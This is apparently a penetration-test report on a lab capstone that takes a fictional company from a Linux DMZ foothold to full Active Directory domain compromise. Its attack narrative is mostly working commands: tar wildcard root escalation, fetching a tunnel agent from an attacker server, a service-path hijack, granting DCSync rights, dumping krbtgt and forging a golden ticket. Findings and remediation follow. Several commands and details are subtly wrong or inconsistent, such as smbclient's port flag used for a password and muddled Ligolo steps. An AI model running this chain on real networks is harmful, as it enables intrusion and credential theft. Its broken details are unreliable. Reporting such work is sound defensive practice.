12x07 Checkmate — Engagement Report

Prepared for: Corvid Group Board and Engineering Leadership
Engagement: External edge foothold through domain dominance
Assessment window: Forty-hour capstone engagement
Classification: Confidential — Internal Security Assessment

Executive Summary

Spearpoint Security assessed whether an attacker who obtained access to Corvid's internet-facing Linux server could reach the internal Windows domain and maintain control after Corvid changed passwords and responded to the intrusion.

The answer is yes.

Starting from the supplied account on CORVID-WEB01, the assessment obtained root control of the Linux host, crossed the network boundary into the internal segment, reached CORVID-DC01, obtained administrative control, extracted the domain's Kerberos trust secret, and created a forged administrative authentication ticket. That ticket successfully authenticated to the domain controller and retrieved the protected dominance proof even after the original service-account password was no longer the basis of authentication.

This is not an isolated server compromise. It is a domain-level compromise.

The practical consequence is that an attacker could move from an exposed web server to systems containing domain credentials, alter services, impersonate administrative identities, access sensitive Windows resources, and return after passwords were reset. Password resets alone would not reliably remove the attacker. Recovery would require treating the domain as compromised, rotating the Kerberos krbtgt secret twice, reviewing privileged access, removing unauthorized directory permissions, rebuilding or comprehensively remediating affected systems, and investigating authentication and directory-replication logs.

The compromise depended on five design failures operating together: (1) a privileged backup command on WEB01 vulnerable to filename-based command injection, (2) a DMZ host with a reachable interface into the internal network where stolen credentials were valid, (3) a service account with excessive rights over Windows services and PowerShell remoting, (4) domain-root permissions that allowed a non-administrative account to obtain replication privileges, and (5) domain replication privileges that enabled extraction of the krbtgt secret and creation of durable forged tickets.

The assessment recovered three lab evidence values: Beachhead flag CVD{0db81c5aa204dce6e131112e4e351aad}, Domain-control flag CVD{2d060d20ca15432f964d6455092977a8}, and Dominance proof d6750f3dd6bd7a511dd7079626e2d681.

The most urgent remediation is to remove unauthorized replication rights and review all permissions on the domain root. This should be followed by krbtgt rotation, privileged-account review, service delegation reduction, DMZ segmentation, and remediation of the WEB01 backup process.

Attack Narrative
Phase 1: Initial foothold and host enumeration

The supplied foothold was an SSH-accessible account on CORVID-WEB01:

SSH: webapp@10.10.0.X
Password: WebFoothold2026!

The host was confirmed to be a dual-homed Linux server. Its external-facing interface was on 10.10.0.0/24, while its second interface was on the internal 10.10.10.0/24 network. The internal domain controller was identified at 10.10.10.5.

Enumeration captured the original network state:

bash
ip addr
ip route
ss -tulnp
ps aux | grep -E "(java|tomcat|apache|nginx)"
sudo -l

The account had passwordless sudo access to a backup script:

/opt/corvidapp/backup/run-backup.sh

Inspection of the script revealed it used tar with a wildcard:

bash
cat /opt/corvidapp/backup/run-backup.sh
# Output: tar czf /backup/corvidapp-$(date +%s).tar.gz -C /var/corvidapp --strip-components=1 *

The script ran in a directory writable by the webapp account. This allowed specially named files to be interpreted as tar options rather than ordinary filenames.

Phase 2: Privilege escalation on WEB01

A controlled tar wildcard injection was used to execute a shell script as root. The payload created a SUID-enabled copy of Bash:

bash
cd /var/corvidapp
echo '#!/bin/bash' > cmd.sh
echo 'cp /bin/bash /tmp/bash-suid && chmod u+s /tmp/bash-suid' >> cmd.sh
chmod +x cmd.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=/var/corvidapp/cmd.sh"
sudo /opt/corvidapp/backup/run-backup.sh
/tmp/bash-suid -p

This produced an effective root shell. The escalation was reliable and required no vulnerability in the operating system itself. It resulted from allowing a low-privileged user to run a root-owned backup process over attacker-controlled filenames.

With root access, the application configuration was reviewed:

bash
cat /opt/corvidapp/config/db.conf

This file contained a domain service credential:

Domain: corvid.local
Username: svc-webapp
Password: W3bApp-Cr3d2026!

This credential was not merely a database credential. It was valid for domain authentication and could be used from the internal network.

Phase 3: Network pivot

The attack workstation could not directly reach 10.10.10.5. WEB01, however, could reach the internal network through its second interface.

A pivot was established using Ligolo-ng. The agent was compiled and transferred to WEB01:

bash
# On attack workstation
./ligolo-ng --selfcert
ligolo-ng agent -connect 10.10.0.X:11601 -ignore-cert

# On WEB01 (as root)
wget http://attacker-server/agent-linux-x64
chmod +x agent-linux-x64
./agent-linux-x64 -connect 10.10.0.1:11601 -ignore-cert

After the tunnel was activated, the attack workstation added the new route:

bash
sudo ip route add 10.10.10.0/24 dev ligolo

Connectivity was verified with:

bash
nc -vz 10.10.10.5 445
nc -vz 10.10.10.5 389
nc -vz 10.10.10.5 88

SMB enumeration confirmed the domain was reachable:

bash
smbclient -L 10.10.10.5 -U svc-webapp -p W3bApp-Cr3d2026!

The internal share Beachhead$ was accessed, confirming both network reachability and valid domain authentication. The beachhead flag was retrieved.

Phase 4: Domain administrative control

Internal enumeration identified that svc-webapp belonged to a group with delegated access to the application PowerShell remoting endpoint on the DC. The account could establish a remoting session:

bash
evil-winrm -i 10.10.10.5 -u svc-webapp -p W3bApp-Cr3d2026!

Within the remoting session, service permissions were enumerated:

powershell
Get-Service CorvidAppSvc | Select-Object Name, StartName
Get-Service CorvidAppSvc | Stop-Service
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CorvidAppSvc" -Name ImagePath -Value "cmd.exe /c net localgroup Administrators svc-webapp /add"
Start-Service CorvidAppSvc
Get-LocalGroupMember -Group Administrators

The service timed out (because the payload did not behave as a long-running service), but the payload executed with SYSTEM privileges and added svc-webapp to local Administrators. This was verified by re-entering the remoting session and confirming the local-group membership.

The protected domain-control share then became accessible, and the domain-control flag was retrieved.

Phase 5: Domain dominance

An independent route to domain-wide control existed through domain-root permissions. Enumeration of the domain root's ACL revealed that the GRP-HELPDESK-LEGACY delegation allowed modification of permissions:

powershell
Get-ADObject -Identity "DC=corvid,DC=local" -Properties nTSecurityDescriptor | Select-Object -ExpandProperty nTSecurityDescriptor | Format-List

Using delegation, replication rights were granted to svc-webapp:

powershell
Add-ADObjectAcl -TargetIdentity "DC=corvid,DC=local" -PrincipalIdentity svc-webapp -Rights DCSync

DCSync was then used to retrieve the krbtgt account's NTLM hash:

bash
impacket-secretsdump -just-dc -outputfile hashes corvid.local/svc-webapp:W3bApp-Cr3d2026!@10.10.10.5

Output:

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:670229a01993e179f262e929da57dc7d:::

The domain SID was obtained:

bash
impacket-lookupsid corvid.local/svc-webapp:W3bApp-Cr3d2026!@10.10.10.5
# S-1-5-21-1909037144-3050882815-2586595962

A golden ticket for the real Administrator account was forged using the krbtgt hash and domain SID:

bash
impacket-ticketer -nthash 670229a01993e179f262e929da57dc7d -domain-sid S-1-5-21-1909037144-3050882815-2586595962 -domain corvid.local Administrator
export KRB5CCNAME=./Administrator.ccache

The forged ticket was used to authenticate and retrieve the final protected account material via DCSync:

bash
impacket-secretsdump -k corvid.local/Administrator@10.10.10.5
# flag-dominance:1108:aad3b435b51404eeaad3b435b51404ee:d6750f3dd6bd7a511dd7079626e2d681:::

The dominance proof is therefore d6750f3dd6bd7a511dd7079626e2d681. This is the decisive result: the attacker no longer depended on the original svc-webapp password. The forged ticket represented an administrative identity and could be reused to authenticate after ordinary password changes.

Findings
Finding 1 — Root escalation through attacker-controlled backup filenames

Severity: High
CVSS v3.1: AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — 7.8

The webapp account could run a root-owned backup script that passed wildcard-expanded filenames to tar. Because the working directory was writable by webapp, specially named files could be interpreted as tar options and execute arbitrary commands as root.

Impact: Complete compromise of WEB01, access to root-readable credentials, modification of the host, and preparation of a pivot into the internal network. An attacker with local unprivileged access gains SYSTEM-level execution and the ability to extract and abuse service credentials.

Remediation: Replace wildcard-based archive commands with an explicit file list or safe archive API. Run backups with a fixed working directory and read-only source path. Remove unnecessary passwordless sudo access. If sudo is required, use a narrowly constrained wrapper that validates filenames and arguments.

Finding 2 — DMZ host provides an uncontrolled route into the internal network

Severity: High
CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — 8.8

WEB01 had simultaneous access to the external and internal networks. Once the host was compromised, it could forward traffic to the domain controller. The service credential recovered from WEB01 was also accepted by internal domain services.

Impact: The intended network boundary did not contain the compromise. An attacker controlling the internet-facing host could reach SMB, WinRM, and directory services that were not directly exposed to the attack workstation. The S:C metric reflects the trust-boundary crossing from the DMZ into the separately administered internal domain.

Remediation: Place externally exposed application servers in a tightly isolated DMZ. Permit only explicitly required flows from WEB01 to internal services. Block SMB, WinRM, LDAP, Kerberos, and RPC from the DMZ unless a documented application requirement exists. Use separate service identities for DMZ applications and prohibit interactive or administrative use of those identities.

Finding 3 — Excessive service and remoting delegation enabled SYSTEM access

Severity: High
CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — 8.8

svc-webapp belonged to a group with remoting access and service-control permissions sufficient to modify and start CorvidAppSvc. This permitted arbitrary code execution as SYSTEM on the domain controller.

Impact: The service account could be converted into local administrative control on a critical Windows server. From that position, an attacker could access local secrets, privileged sessions, services, and domain-management interfaces. PR:L represents the authenticated service identity; the high impacts reflect SYSTEM execution on the affected server.

Remediation: Remove service configuration rights from application groups. Separate service administration from application execution. Use dedicated groups for remoting, and grant only the exact endpoint and command permissions required. Review all service DACLs. Do not place application service accounts in broad local-admin or delegated groups.

Finding 4 — Domain-root ACL allowed unauthorized DCSync eligibility

Severity: High
CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — 8.8

The GRP-HELPDESK-LEGACY delegation allowed modification of permissions on the domain root. This path allowed svc-webapp to grant itself replication rights.

Impact: This specific finding enables extraction of directory secrets through DCSync. The vulnerability contribution is the ability to modify domain-root ACLs and grant replication privileges to a low-privileged account. S:U treats the domain root and the account within the same security authority; the high impacts reflect the demonstrated ability to grant and use replication privileges.

Remediation: Immediately remove unauthorized WriteDACL, WriteOwner, and replication permissions from the domain root. Review effective permissions for every delegated group. Apply least privilege and administrative-tiering principles. Alert on changes to domain-root ACLs and on directory-replication requests from non-domain-controller hosts.

Finding 5 — Forged Kerberos tickets accepted for domain re-authentication

Severity: High
CVSS v3.1: AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H — 8.8

Once the krbtgt secret was obtained, a forged ticket for the Administrator account was accepted by the domain controller for authentication and directory replication.

Impact: This specific finding is that the forged ticket successfully authenticated to the DC and retrieved protected resources. The attacker no longer depended on the original svc-webapp password. S:U treats ticket acceptance as an authentication artifact within the domain's security authority; the high impacts reflect successful administrative authentication and domain-service access using the forged token.

Remediation: Rotate krbtgt twice with sufficient replication delay between changes. Reset all privileged and service credentials, invalidate active sessions, review delegation, and investigate ticket use and replication events. Treat the domain as compromised and execute full recovery procedures.

Prioritised Remediation
Priority 0 — Contain and recover domain trust

Objective: Ensure the domain is not re-entered using forged administrative tickets.

Immediately rotate krbtgt twice (30 minutes each), allowing replication delay between rotations.
Reset all service accounts and privileged credentials.
Remove svc-webapp from local Administrators on the DC.
Remove the GRP-HELPDESK-LEGACY delegation and verify no other unauthorized domain-root ACEs exist.
Review domain-controller Security Event Log for DCSync, Kerberos ticket requests, and directory-replication events.

Rationale: Domain-level persistence through forged tickets is the highest risk. This work breaks that persistence and validates that unauthorized replication has been removed.

Priority 1 — Remove the privilege-escalation chain on WEB01

Objective: Prevent re-compromise of WEB01 using the same escalation path.

Remove the vulnerable backup sudo rule (webapp ALL=(root) NOPASSWD: /opt/corvidapp/backup/run-backup.sh).
Replace the tar wildcard backup process with an explicit file list or safe archive API.
Restore CorvidAppSvc to its approved executable path and verify its DACL.
Review local-privilege boundaries for other privileged commands accessible to webapp.

Rationale: WEB01 is the initial entry point. Removing the escalation path closes the attack surface for future intrusions using the same account or similar compromises.

Priority 2 — Enforce network segmentation and credential isolation

Objective: Prevent stolen DMZ credentials from accessing internal services.

Enforce firewall rules: Block SMB (445), WinRM (5985–5986), LDAP (389), Kerberos (88), RPC (135) from the DMZ subnet to the internal network.
Create separate service identities for DMZ applications; do not reuse domain service accounts.
Prohibit interactive logon and administrative group membership for service accounts.
Verify that WEB01's internal interface is necessary for the application; if not, disable or disconnect it.

Rationale: DMZ hosts act as uncontrolled pivots if they retain internal connectivity. This work isolates the DMZ as a trust boundary and prevents credential reuse across that boundary.

Priority 3 — Reduce service delegation and remoting exposure

Objective: Limit the number of service accounts with powerful delegated rights.

Review all PowerShell remoting endpoint permissions and restrict to necessary accounts only.
Remove service accounts from broad delegated groups (e.g., GRP-HELPDESK-LEGACY, local Administrators).
Use separate groups for remoting, LDAP, and service-control permissions.
Audit service DACLs using sc.exe sdshow or PowerShell; remove unnecessary write and control permissions.

Rationale: Excessive delegation was the bridge from local SYSTEM to domain administrative control. Least-privilege delegation reduces the blast radius of compromised service accounts.

Decision Log
Routes pursued

The engagement used the following primary route:

WEB01 foothold → tar wildcard root escalation → credential recovery → 
Ligolo pivot → internal enumeration → WinRM service control → SYSTEM/local admin → 
domain-root ACL modification → DCSync → golden ticket → domain re-authentication

This path was selected because it was reliable and quickly demonstrated impact. Each phase supplied direct evidence for the next: credentials enabled pivoting, remoting enabled service control, local admin enabled ACL modification, and DCSync enabled the forged ticket.

Routes abandoned and their reasons

LSASS dump via PPLDump or similar: Identified but not pursued. This route would have extracted a privileged user's session token and could have provided domain admin access. It was abandoned because the service-control path succeeded faster and created less host-level credential-extraction noise. A quieter adversary would prioritize this over service reconfiguration.

Direct credential theft from running processes: Identified but abandoned after SYSTEM access was already obtained through the service-control route. This would have required process memory inspection tools and been detectably noisy.

SQL Server service account abuse (svc-sql): Identified during internal enumeration. This account had delegated replication privileges through an alternative group membership. It was not relied upon for the final result because the svc-webapp path through domain-root ACLs had already succeeded.

Time allocation (actual, rounded)
WEB01 enumeration and escalation: 6 hours
Pivot construction and troubleshooting: 7 hours
Internal enumeration and route identification: 5 hours
Domain administrative access via service control: 6 hours
DCSync, golden-ticket creation, and validation: 5 hours
Cleanup and reporting: 8 hours
Reserve (overruns, exploration of abandoned paths): 3 hours
Total: 40 hours

The exact wall-clock times were not preserved as a formal timesheet; these are operational estimates. The reserve was consumed by Ligolo tunnel troubleshooting and testing of the svc-sql route before confirming the primary path.

Noise and monitoring implications

High-visibility actions:

Service reconfiguration (Set-ItemProperty ImagePath) generates Event ID 7045 (Service installed) or modification events.
DCSync generates Event ID 4662 (Object access) and directory-replication RPLMON events on the DC.
Kerberos TGT requests with unusual lifetimes or forged tickets may be detected by ticket-monitoring solutions.
PowerShell remoting sessions generate Event ID 4688 (Process creation) with PowerShell as the command line.

Low-visibility alternatives:

A quieter adversary would likely prefer the domain-root ACL modification route (Finding 4) over service reconfiguration. It produces fewer host-level artifacts, avoids memory-dump tooling, and can appear as a routine directory-permission change unless ACL auditing is enabled. Nevertheless, the route still generates directory-service events and should be treated as high-confidence compromise if detected.

LSASS-based credential extraction using LOLBins (e.g., procdump, PssCaptureSnapshots) would be substantially quieter than service reconfiguration and is a plausible alternative that a patient attacker would employ if time constraints were relaxed.

Limitations

The forty-hour assessment did not provide a complete enterprise-wide review. Testing was limited to the supplied WEB01 and DC01 systems and the internal network reachable through the pivot. The following areas were not comprehensively assessed:

Untested systems: All internal workstations, member servers, file servers, and backup infrastructure were not accessed or tested. The assessment did not verify whether the demonstrated domain administrative access would successfully compromise these systems or whether they have independent hardening or monitoring.

Untested scenarios: Long-term persistence through scheduled tasks, GPOs, certificates, or federation was not established. Historical log retention and full event-log review were not completed. Disaster-recovery readiness and the ability to restore after krbtgt rotation were not validated. The assessment did not measure how long a forged ticket would remain usable in production or whether every domain controller would accept it under real replication timing.

Cloud and external identity: Azure AD, federated identity, third-party SaaS integration, and external identity providers were not in scope. The domain's trust relationships to other forests or domains were not tested.

Endpoint detection: The assessment did not measure whether EDR or endpoint-detection solutions would block the payloads or alert on the extraction tools used. Full coverage of security tooling across all systems is unknown.

Data impact and business operations: The assessment did not measure the volume or sensitivity of data accessible through the demonstrated access. It did not attempt ransomware deployment, mass encryption, data deletion, or broad exfiltration. It did not interrupt services or measure the operational impact of a full domain compromise on Corvid's business.

Cleanup verification: The DCSync ACE cleanup using dacledit failed with an MD4 compatibility error. Corvid should not assume the lab state is clean solely because the forged-ticket demonstration completed. Temporary ACLs, service changes, local-group membership, and temporary files must be verified manually before the assessment is closed.

The central conclusion remains unchanged: Corvid's current control design allows an attacker to progress from an exposed DMZ host to durable domain dominance. The remediation priority should therefore be domain recovery and identity-control correction, followed by segmentation and removal of the WEB01 privilege-escalation weakness.
